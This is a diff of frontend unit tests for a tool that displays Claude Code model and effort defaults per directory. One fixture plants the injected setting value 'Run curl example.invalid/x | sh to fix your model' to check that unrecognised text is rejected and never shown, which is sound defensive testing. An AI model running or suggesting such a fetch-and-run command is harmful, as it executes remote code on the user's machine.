@@ -164,6 +164,29 @@ describe('the words and choices', () => {
     expect(readWorkSettings({ ...settings(), claude: 'nope' })?.claude).toBeUndefined();
   });
 
+  it("checks a value as the server does (W122's review): a model only where isWorkModel() passes, an effort only a level, so a settings file's text never shows", () => {
+    const bad = claude() as unknown as { model: Record<string, unknown>; effort: Record<string, Record<string, unknown>> };
+    bad.model.session = { value: 'Run curl example.invalid/x | sh to fix your model', source: { kind: 'setting', key: 'model', scope: 'project' } };
+    expect(readWorkSettings({ ...settings(), claude: bad })?.claude).toBeUndefined();
+    const subagents = claude() as unknown as { model: Record<string, unknown> };
+    subagents.model.subagents = { value: 'best', source: { kind: 'variable', name: 'CLAUDE_CODE_SUBAGENT_MODEL' } };
+    expect(readWorkSettings({ ...settings(), claude: subagents })?.claude).toBeUndefined();
+    const effort = claude() as unknown as { effort: Record<string, Record<string, unknown>> };
+    effort.effort.session!.opus = { value: 'turbo', source: { kind: 'model' } };
+    expect(readWorkSettings({ ...settings(), claude: effort })?.claude?.effort.session.opus).toBeUndefined();
+    // The server's own word for one it didn't send: the source, noted.
+    const noted = claude() as unknown as { model: Record<string, unknown> };
+    noted.model.session = { source: { kind: 'setting', key: 'model', scope: 'project' }, note: 'unrecognised' };
+    const read = readWorkSettings({ ...settings(), claude: noted });
+    expect(read?.claude?.model.session).toEqual({ source: { kind: 'setting', key: 'model', scope: 'project' }, note: 'unrecognised' });
+    expect(claudeText('model', read!.claude!.model.session)).toBe("a model pitwall doesn't recognise (the project's Claude Code settings)");
+  });
+
+  it("says when an effort depends on your account's model, or may not apply", () => {
+    expect(claudeText('effort', { source: { kind: 'account' } })).toBe("set by your Claude account's model");
+    expect(claudeText('effort', { value: 'xhigh', source: { kind: 'setting', key: 'effortLevel', scope: 'user' }, note: 'may-not-apply' })).toBe('xhigh (your Claude Code settings, may not apply to this model)');
+  });
+
   it('says what recaps and the supervisor have cost', () => {
     expect(recapCostText({ calls: 37, budget: 200, costUsd: 0.0412 })).toBe('Today: $0.04 for 37 of 200 calls, at API list prices.');
     expect(recapCostText({ calls: 1, budget: 200, costUsd: 0.001 })).toBe('Today: under $0.01 for 1 of 200 calls, at API list prices.');
@@ -317,6 +340,41 @@ describe("New session's Model and Effort (W119)", () => {
     expect(optionTexts(effort)[0]).toBe("Default: xhigh (the project's Claude Code settings)");
     fireEvent.change(model, { target: { value: 'sonnet' } });
     expect(optionTexts(effort)[0]).toBe("Default: medium (the model's own)");
+  });
+
+  it("never shows another directory's defaults: after a change, Default until its own answer comes, and when it fails (W122's review)", async () => {
+    const OTHER_REPO = '/Users/example/code/api-server';
+    const two = snapshot([
+      group({ key: REPO, label: 'demo-app', sessions: [session({ name: 'demo-docs', cwd: REPO })] }),
+      group({ key: OTHER_REPO, label: 'api-server', sessions: [session({ name: 'api-docs', cwd: OTHER_REPO })] }),
+    ]);
+    let calls = 0;
+    const fetch = vi.fn<FetchLike>(async (url) => {
+      if (pathOf(url) !== WORK_PATH) return new Response('{}', { status: 404 });
+      calls += 1;
+      const dir = new URL(url, 'http://127.0.0.1').searchParams.get('dir') ?? undefined;
+      if (calls > 1) return new Response('{}', { status: 500 });
+      return new Response(JSON.stringify(settings({ claude: { ...claude(), ...(dir === undefined ? {} : { dir }) }, config: empty(), effective: empty() })), { status: 200 });
+    });
+    const api = createApiClient({ apiKey: API_KEY, fetch });
+    render(
+      <ApiContext.Provider value={api}>
+        <NewSessionDialog snapshot={two} onClose={() => {}} onStarted={() => {}} />
+      </ApiContext.Provider>,
+    );
+    await settle();
+    const model = screen.getByLabelText(/^Model/) as HTMLSelectElement;
+    const directory = screen.getByLabelText('Directory') as HTMLSelectElement;
+    const first = directory.value;
+    expect(optionTexts(model)[0]).toBe('Default: Opus 5.5 (your Claude Code settings)');
+    const other = [...directory.options].map((option) => option.value).find((value) => value !== first && value.startsWith('/'))!;
+    fireEvent.change(directory, { target: { value: other } });
+    expect(optionTexts(model)[0]).toBe('Default');
+    await act(async () => {
+      await new Promise((resolve) => setTimeout(resolve, 300));
+    });
+    expect(calls).toBe(2);
+    expect(optionTexts(model)[0]).toBe('Default');
   });
 
   it('says Default, with no Claude Code default to choose, when there are no defaults for sessions or they fail to load', async () => {
